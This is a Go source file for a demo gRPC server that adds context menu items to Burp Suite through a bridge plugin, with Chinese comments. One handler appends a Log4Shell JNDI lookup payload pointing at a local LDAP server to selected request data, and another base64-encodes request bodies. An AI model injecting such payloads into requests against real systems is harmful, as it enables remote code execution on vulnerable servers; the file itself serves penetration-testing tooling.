package main

import (
	"context"
	"encoding/base64"
	"fmt"
	"go-Demo-MorePossibility/MorePossibility/proto/BurpApi"
	"google.golang.org/grpc"
	"net"
)

// ConTextMenuItemsDemo 上下文提供程序
type ConTextMenuItemsDemo struct {
	BurpApi.UnimplementedGetConTextMenuItemsServerServer
}

// GetConTextMenuItems 获取菜单项
func (ConTextMenuItemsDemo) GetConTextMenuItems(c context.Context, str *BurpApi.Str) (*BurpApi.MenuInfo, error) {

	return &BurpApi.MenuInfo{
		TarGet: "127.0.0.1:9000",
		Menu: &BurpApi.Menu{
			Name:     "菜单演示",
			MenuList: nil,
			MenuItemList: []*BurpApi.MenuItem{
				&BurpApi.MenuItem{Name: "base64"},
			},
		},
	}, nil

	//return &BurpApi.MenuInfo{
	//	TarGet: "127.0.0.1:9000", // 地址
	//	Menu: &BurpApi.Menu{ // 一个菜单  一个菜单可以有多个菜单和菜单项
	//		Name: "第一个菜单",
	//		MenuList: []*BurpApi.Menu{
	//			&BurpApi.Menu{
	//				Name:     "第一下的第一个菜单",
	//				MenuList: nil,
	//				MenuItemList: []*BurpApi.MenuItem{
	//					&BurpApi.MenuItem{Name: "第一个菜单项"},
	//				},
	//			},
	//			&BurpApi.Menu{
	//				Name:         "第一下的第二个菜单",
	//				MenuList:     nil,
	//				MenuItemList: nil,
	//			},
	//		}, // 菜单列表
	//		MenuItemList: []*BurpApi.MenuItem{ // 菜单项列表
	//			&BurpApi.MenuItem{Name: "第一个菜单项呀"},
	//			&BurpApi.MenuItem{Name: "第二个菜单项呀"},
	//		},
	//	},
	//}, nil
}

// ContextItems 上下文项处理
type ContextItems struct {
	BurpApi.UnimplementedContextMenuItemsProviderServer
}

// MenuItemsProvider 菜单项处理
func (ContextItems) MenuItemsProvider(c context.Context, cmi *BurpApi.ContextMenuItems) (*BurpApi.MenuItemsReturn, error) {
	fmt.Println("菜单项处理: " + cmi.GetName())
	if cmi.GetIsSelect() { // 是否用选中数据
		fmt.Println("选中数据")
		selectData := cmi.GetSelectData()                                                   // 获取选中数据
		newSelectData := append(selectData, []byte("${jndi:ldap://127.0.0.1:1389/xxx}")...) // 在选中的数据后面加上载荷
		return &BurpApi.MenuItemsReturn{
			IsContinue:     false,         // 继续不做任何处理
			IsReviseSelect: true,          // 修改选中数据
			IsReviseReq:    false,         // 修改请求只能在 重放器使用
			IsReviseRes:    false,         // 修改响应 目标官方API有这个操作但是不可用 截止 2023.06.29
			ReqData:        nil,           // 请求数据 要改的话就要有
			ResData:        nil,           // 响应数据
			SelectDate:     newSelectData, // 选中的数据
		}, nil
	}
	fmt.Println("没有选中任何数据")
	return &BurpApi.MenuItemsReturn{IsContinue: true}, nil
}

// ContextItemsBaseDemo 对请求体进行base64编码
type ContextItemsBaseDemo struct {
	BurpApi.UnimplementedContextMenuItemsProviderServer
}

// MenuItemsProvider 对请求体进行base64编码
func (ContextItemsBaseDemo) MenuItemsProvider(c context.Context, cmi *BurpApi.ContextMenuItems) (*BurpApi.MenuItemsReturn, error) {
	fmt.Println("菜单项处理: " + cmi.GetName())                  // 菜单项名称
	reqData := cmi.GetHttpReqAndRes().GetReq().GetData()    // 获取请求数据
	index := cmi.GetHttpReqAndRes().GetReq().GetBodyIndex() // 获取请求体开始下标 如果没有请求下标就等于总长度
	if int64(len(reqData)) != index {                       // 不等于便是有请求体
		body := reqData[index:]                                 // 截取请求体
		base64String := base64.StdEncoding.EncodeToString(body) // 进行base64编码

		newReq := append(reqData[:index], []byte(base64String)...) // 组装新的请求

		return &BurpApi.MenuItemsReturn{
			IsContinue:     false,
			IsReviseSelect: false,
			IsReviseReq:    true, // 修改请求
			IsReviseRes:    false,
			ReqData:        newReq, // 新的请求数据
			ResData:        nil,
			SelectDate:     nil,
		}, nil
	}
	fmt.Println("没有请求体")
	return &BurpApi.MenuItemsReturn{IsContinue: true}, nil
}

func main() {

	listen, err := net.Listen("tcp", ":9000")
	if err != nil {
		panic(err)
	}

	server := grpc.NewServer()
	BurpApi.RegisterGetConTextMenuItemsServerServer(server, ConTextMenuItemsDemo{}) // 获取菜单
	//BurpApi.RegisterContextMenuItemsProviderServer(server, ContextItems{})          // 菜单项处理程序
	BurpApi.RegisterContextMenuItemsProviderServer(server, ContextItemsBaseDemo{}) //
	fmt.Println("服务启动")
	err = server.Serve(listen)
	if err != nil {
		panic(err)
	}

}
